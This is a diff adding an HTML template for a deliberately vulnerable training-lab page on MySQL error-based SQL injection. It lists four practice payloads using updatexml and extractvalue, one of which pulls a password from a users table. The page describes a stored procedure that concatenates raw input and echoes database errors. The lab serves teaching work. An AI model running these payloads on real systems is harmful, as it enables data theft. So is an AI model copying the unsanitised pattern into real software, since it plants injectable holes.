@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MySQL 报错注入 - 实验区</title>
+    <link rel="stylesheet" th:href="@{/lab/lab.css}">
+</head>
+<body>
+<div th:replace="~{lab/partials/nav :: nav('error')}"></div>
+
+<main class="page">
+    <section class="hero">
+        <div class="eyebrow">Error Based</div>
+        <h1>MySQL 报错注入</h1>
+        <p>Java 调用 <code class="mono">CALL lab_user_by_id(?)</code>，真正的 SQL 由数据库存储过程拼接。错误信息原样进入页面，可用 <code class="mono">updatexml</code> 或 <code class="mono">extractvalue</code> 触发 XPath 错误来带出表达式结果。</p>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <div>
+                <h2>按 ID 查询用户</h2>
+                <p>存储过程内部拼出 <code class="mono">WHERE id = </code> + 输入，未做类型转换。</p>
+            </div>
+            <a class="btn btn-ghost btn-sm" th:href="@{/lab}">返回总览</a>
+        </div>
+        <div class="panel-body">
+            <form class="form-grid" method="get" th:action="@{/lab/sql/error}">
+                <div class="field">
+                    <label for="error-id">id 参数</label>
+                    <input id="error-id" class="mono" type="text" name="id" th:value="${idInput}" autofocus>
+                </div>
+                <div class="field">
+                    <button class="btn btn-primary" type="submit">执行</button>
+                </div>
+            </form>
+        </div>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <h2>执行结果</h2>
+            <span class="status-pill info" th:text="${rowCount} + ' 行结果'">0 行结果</span>
+        </div>
+        <div class="panel-body">
+            <div th:if="${dbError != null}" class="db-error" th:text="${dbError}">数据库错误</div>
+
+            <div th:if="${rows.empty and dbError == null}" class="empty-state">未找到对应 ID 的用户。</div>
+            <div th:unless="${rows.empty}" class="table-wrap">
+                <table class="data-table">
+                    <thead>
+                    <tr>
+                        <th th:each="column : ${columns}" th:text="${column}">列</th>
+                    </tr>
+                    </thead>
+                    <tbody>
+                    <tr th:each="row : ${rows}">
+                        <td th:each="cell : ${row}" th:text="${cell}">值</td>
+                    </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <h2>练习载荷</h2>
+        </div>
+        <div class="panel-body">
+            <ul class="payload-list">
+                <li>1 AND updatexml(1,concat(0x7e,database(),0x7e),1)</li>
+                <li>1 AND updatexml(1,concat(0x7e,version(),0x7e),1)</li>
+                <li>1 AND extractvalue(1,concat(0x7e,user(),0x7e))</li>
+                <li>1 AND updatexml(1,concat(0x7e,(SELECT password FROM users WHERE id=1),0x7e),1)</li>
+            </ul>
+        </div>
+        <div class="panel-footer">若数据库连接正常且输入合法，页面先返回普通结果；构造函数后则看到以 “XPATH syntax error” 开头的回显。</div>
+    </section>
+</main>
+</body>
+</html>
